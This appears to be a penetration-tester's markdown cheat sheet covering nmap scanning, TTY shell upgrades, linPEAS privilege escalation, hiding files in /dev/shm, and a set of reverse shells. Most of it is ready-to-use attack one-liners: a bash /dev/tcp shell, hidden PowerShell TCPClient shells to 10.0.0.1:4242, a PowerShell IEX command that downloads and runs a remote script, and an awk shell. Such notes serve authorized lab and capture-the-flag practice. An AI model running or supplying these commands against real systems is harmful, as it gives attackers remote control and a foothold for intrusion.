## DATA COLLECTION 

```nmap
nmap -sV -sC -oA <ip> <outputfile>
```

Dirb any available port 80 address

### TTY SHELL

```python
python -c 'import pty; pty.spawn("/bin/sh")'
```

https://netsec.ws/?p=337

### IPPSEC explains terminal upgrades tty

CTRL + Z (Background process)
stty raw -echo (local term don't process tabs, send through to terminal)
fg (foreground shell)


https://youtu.be/CYeVUmOar3I?t=789

### PRIVESC 

https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh

## STORE FILES IN MEM

```dev
/dev/shm
```

Upload any files to Ram disk that will clear on reboot.

## REVERSE SHELL

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

https://github.com/pentestmonkey/php-reverse-shell

## BASH RS

```bash
bash -c 'bash -i >& /dev/tcp/<your_ip>/<port> 0>&1'
```

## Powershell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
```
## Awk

```powershell
awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### SHELL COMMANDS

```SHELL
SHELL=/bin/bash script -q /dev/null
```

Explanation for /dev/null
https://askubuntu.com/questions/306047/what-does-the-script-dev-null-do
